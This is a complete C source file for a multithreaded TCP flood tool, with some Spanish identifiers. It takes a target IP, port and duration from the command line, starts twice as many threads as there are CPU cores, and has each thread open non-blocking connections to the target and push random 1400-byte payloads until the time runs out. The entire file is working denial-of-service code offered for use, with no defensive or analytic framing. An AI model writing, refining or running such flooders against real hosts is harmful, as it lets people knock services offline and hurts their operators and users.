#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <linux/tcp.h>
#include <sys/socket.h>
#include <stdint.h>
#include <sys/select.h>
#include <pthread.h>
#include <errno.h>
#include <fcntl.h>

#define SIZE 1400

struct argsattack {
    char *ip;
    int port;
    int duracion;
    time_t start;
};

static int countcpu(void) {
    long cpus = sysconf(_SC_NPROCESSORS_ONLN);
    if (cpus <= 0) return 4;  // fallback
    return (int)(cpus * 2);
}

static void *tcp_flood(void *arg) {
    struct argsattack *args = (struct argsattack *)arg;
    time_t end = args->start + args->duracion;

    struct sockaddr_in dst = {0};
    dst.sin_family = AF_INET;
    dst.sin_port = htons(args->port);
    dst.sin_addr.s_addr = inet_addr(args->ip);

    unsigned int seed = (unsigned int)(time(NULL) ^ (uintptr_t)pthread_self());

    while (time(NULL) < end) {
        for (int attempt = 0; attempt < 100; attempt++) {
            if (time(NULL) >= end) break;

            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if(sock < 0) continue;

            fcntl(sock, F_SETFL, fcntl(sock, F_GETFL, 0) | O_NONBLOCK);

            int flag = 1;
            setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(flag));
#ifdef TCP_QUICKACK
            setsockopt(sock, IPPROTO_TCP, TCP_QUICKACK, &flag, sizeof(flag));
#endif
            connect(sock, (struct sockaddr *)&dst, sizeof(dst));

            fd_set fdw;
            FD_ZERO(&fdw);
            FD_SET(sock, &fdw);
            struct timeval tv = {0, 0};

            if (select(sock + 1, NULL, &fdw, NULL, &tv) <= 0) {
                close(sock);
                continue;
            }

            int err = 0;
            socklen_t len = sizeof(err);
            if (getsockopt(sock, SOL_SOCKET, SO_ERROR, &err, &len) < 0 || err != 0) {
                close(sock);
                continue;
            }

            char payload[SIZE];
            for(int i = 0; i < SIZE; i++){
                payload[i] = (char)(rand_r(&seed) & 0xFF);
            }
            while (time(NULL) < end) {
                ssize_t sent = send(sock, payload, SIZE, MSG_NOSIGNAL);
                if (sent <= 0){
                    break;
                }
            }

            close(sock);
        }
    }

    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Uso: %s <ip> <port> <time>\n", argv[0]);
        return 1;
    }

    struct argsattack args = {
        .ip       = argv[1],
        .port     = atoi(argv[2]),
        .duracion = atoi(argv[3]),
        .start    = time(NULL)
    };

    int num_threads = countcpu();
    pthread_t *threads = calloc(num_threads, sizeof(pthread_t));
    if (!threads) {
        perror("calloc");
        return 1;
    }

    printf("[ TCP FLOOD ] send: %s:%d  |  time: %d s  |  threads: %d\n",
           args.ip, args.port, args.duracion, num_threads);
    fflush(stdout);

    for (int i = 0; i < num_threads; i++) {
        pthread_create(&threads[i], NULL, tcp_flood, &args);
    }

    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\n[ TCP FLOOD ] Finalizado\n");
    free(threads);
    return 0;
}
